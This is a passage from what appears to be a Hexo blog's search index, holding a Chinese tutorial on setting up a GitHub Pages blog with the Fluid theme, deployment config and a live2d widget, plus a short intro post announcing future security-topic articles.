src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808160800840.png" alt="image-20230808160800840"></p><p>浏览器访问，默认路径<a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808160847398.png" alt="image-20230808160847398"></p><h3 id="更换使用Fluid主题"><a href="#更换使用Fluid主题" class="headerlink" title="更换使用Fluid主题"></a>更换使用Fluid主题</h3><p>下载 <a href="https://github.com/fluid-dev/hexo-theme-fluid/releases">最新 release 版本</a> 解压到 <code>themes</code> 目录，并将解压出的文件夹重命名为 <code>fluid</code></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808161347061.png" alt="image-20230808161347061"></p><p>如下修改 <code>Hexo</code> 博客目录中的 <code>_config.yml</code>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid  <span class="hljs-meta"># 指定主题</span><br><span class="hljs-symbol">language:</span> <span class="hljs-built_in">zh</span>-CN  <span class="hljs-meta"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162045506.png" alt="image-20230808162045506"></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162106017.png" alt="image-20230808162106017"></p><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> about<br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162133409.png" alt="image-20230808162133409"></p><p>创建成功后，编辑博客目录下 &#x2F;source&#x2F;about&#x2F;index.md，添加 layout 属性。</p><p>修改后的文件示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">title:</span> <span class="hljs-string">about</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-09 19:20:33</span><br><span class="hljs-attr">layout:</span> <span class="hljs-string">about</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162259101.png" alt="image-20230808162259101"></p><h3 id="博客部署到Github"><a href="#博客部署到Github" class="headerlink" title="博客部署到Github"></a>博客部署到Github</h3><p>安装hexo-deployer-git</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>修改根目录下的<code> _config.yml</code>，配置 GitHub 相关信息</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repo:</span> https:<span class="hljs-comment">//github.com/remixxyh/3xsh0re.github.io.git</span><br><span class="hljs-symbol">  branch:</span> main<br><span class="hljs-symbol">  token:</span> 你的token<br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230809100802858.png" alt="image-20230809100802858"></p><p>执行命令完成部署，可能出现一些git的报错，自寻搜索即可解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo g -d<br></code></pre></td></tr></table></figure><h3 id="图片插件"><a href="#图片插件" class="headerlink" title="图片插件"></a><strong>图片插件</strong></h3><p>插件<code>hexo-renderer-marked</code>解决了这个问题。可以只用<code>npm install hexo-renderer-marked</code>命令直接安装，之后在根目录下的<code>config.yml</code>中更改配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">post_asset_folder</span>: <span class="hljs-literal">true</span><br><span class="hljs-attr">marked</span>:<br>  <span class="hljs-attr">prependRoot</span>: <span class="hljs-literal">true</span><br>  <span class="hljs-attr">postAsset</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>之后就可以在使用<code>![](image.jpg)</code>的方式愉快的插入图片了</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-41-43.png"></p><h3 id="个性化fluid"><a href="#个性化fluid" class="headerlink" title="个性化fluid"></a>个性化fluid</h3><h4 id="个性化页面"><a href="#个性化页面" class="headerlink" title="个性化页面"></a>个性化页面</h4><p>修改<code>themes/fluid</code>下的<code>_config.yml</code>，这是主题相关的配置文件</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-44-04.png"></p><h5 id="修改浏览器标签"><a href="#修改浏览器标签" class="headerlink" title="修改浏览器标签"></a>修改浏览器标签</h5><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-59-38.png"></p><h5 id="修改导航栏title"><a href="#修改导航栏title" class="headerlink" title="修改导航栏title"></a>修改导航栏title</h5><p>搜索：<code>navbar</code></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-01-09.png"></p><h5 id="修改欢迎字样"><a href="#修改欢迎字样" class="headerlink" title="修改欢迎字样"></a>修改欢迎字样</h5><p>搜索：<code>slogan</code></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-03-16.png"></p><h5 id="修改关于页面"><a href="#修改关于页面" class="headerlink" title="修改关于页面"></a>修改关于页面</h5><p>在配置文件里搜索：<code>about</code>，即可修改关于页面；图片资源在<code>hexo-blog\themes\fluid\source\img</code>文件夹里添加修改</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-50-47.png"></p><p>效果：</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-52-35.png"></p><h4 id="添加live2d桌宠"><a href="#添加live2d桌宠" class="headerlink" title="添加live2d桌宠"></a>添加live2d桌宠</h4><h5 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h5><p>首先我们需要安装一个插件，用于在<code>hexo</code>里使用<code>live2d</code></p><p><code>npm install --save hexo-helper-live2d</code></p><h5 id="下载安装live2d模型"><a href="#下载安装live2d模型" class="headerlink" title="下载安装live2d模型"></a>下载安装live2d模型</h5><p>通过<code>npm install npm install --save live2d-widget-model-xxx</code>来安装你喜欢的模型</p><p>比方说我喜欢的是小猫猫，那就使用<code>npm install npm install --save live2d-widget-model-tororo</code>进行安装</p><p><a href="https://blog.51cto.com/u_16162646/6494412">模型预览</a></p><p><a href="https://github.com/xiazeyu/live2d-widget-models">模型Github地址</a></p><p>安装后我们在根目录下的<code>node_modules</code>目录下面找到<code>live2d-widget-model-tororo</code>这个文件夹，把这个文件夹复制下来，找到我们的<code>hexo</code>博客的根目录（也可以在根目录新建一个文件夹专门存放模型），把刚刚我们复制的文件粘贴过来</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-18-54.png"></p><h5 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h5><p>在根目录下的<code>_config.yml</code>配置，这样以后换了主题就不用重新配置了，<strong>注意在<code>model</code>那里填写自己的模型文件名称</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">live2d:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 是否启动</span><br>  <span class="hljs-attr">scriptFrom:</span> <span class="hljs-string">local</span> <span class="hljs-comment"># 默认</span><br>  <span class="hljs-attr">pluginRootPath:</span> <span class="hljs-string">live2dw/</span>  <span class="hljs-comment"># 插件在站点上的根目录(相对路径)</span><br>  <span class="hljs-attr">pluginJsPath:</span> <span class="hljs-string">lib/</span>  <span class="hljs-comment"># 脚本文件相对与插件根目录路径</span><br>  <span class="hljs-attr">pluginModelPath:</span> <span class="hljs-string">assets/</span>  <span class="hljs-comment"># 模型文件相对与插件根目录路径</span><br>  <span class="hljs-attr">tagMode:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span><br>  <span class="hljs-attr">debug:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 调试, 是否在控制台输出日志</span><br>  <span class="hljs-attr">model:</span><br>    <span class="hljs-attr">use:</span> <span class="hljs-string">live2d-widget-model-tororo</span> <span class="hljs-comment">## 模型文件</span><br>  <span class="hljs-attr">display:</span><br>    <span class="hljs-attr">position:</span> <span class="hljs-string">right</span> <span class="hljs-comment"># 定位方向 left right top bottom</span><br>    <span class="hljs-attr">width:</span> <span class="hljs-number">150</span>  <span class="hljs-comment"># 小人宽度</span><br>    <span class="hljs-attr">height:</span> <span class="hljs-number">300</span> <span class="hljs-comment">#  小人高度</span><br>    <span class="hljs-attr">hOffset:</span> <span class="hljs-number">-15</span>  <span class="hljs-comment"># 向 偏移</span><br>    <span class="hljs-attr">vOffset:</span> <span class="hljs-number">-15</span>  <span class="hljs-comment"># 像 偏移</span><br>  <span class="hljs-attr">mobile:</span><br>    <span class="hljs-attr">show:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 手机端是否显示</span><br>  <span class="hljs-attr">react:</span><br>    <span class="hljs-attr">opacity:</span> <span class="hljs-number">0.7</span>  <span class="hljs-comment"># 模型透明度</span><br></code></pre></td></tr></table></figure><p>添加到文件末尾即可：</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-10-54.png"></p><p>然后你就成功拥有一只小猫啦！</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-19-57.png"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客简介</title>
    <link href="/2022/12/08/Hello!/"/>
    <url>/2022/12/08/Hello!/</url>
    
    <content type="html"><![CDATA[<h2 id="欢迎来到3xsh0re的博客"><a href="#欢迎来到3xsh0re的博客" class="headerlink" title="欢迎来到3xsh0re的博客"></a>欢迎来到3xsh0re的博客</h2><span id="more"></span><p>在这里，我会更新渗透测试、SRC挖掘、web安全、逆向分析、二进制安全的一些内容，希望自己可以持之以恒的学习下去👍</p><p><img src="/2022/12/08/Hello!/Pikachu.png"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>简介</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
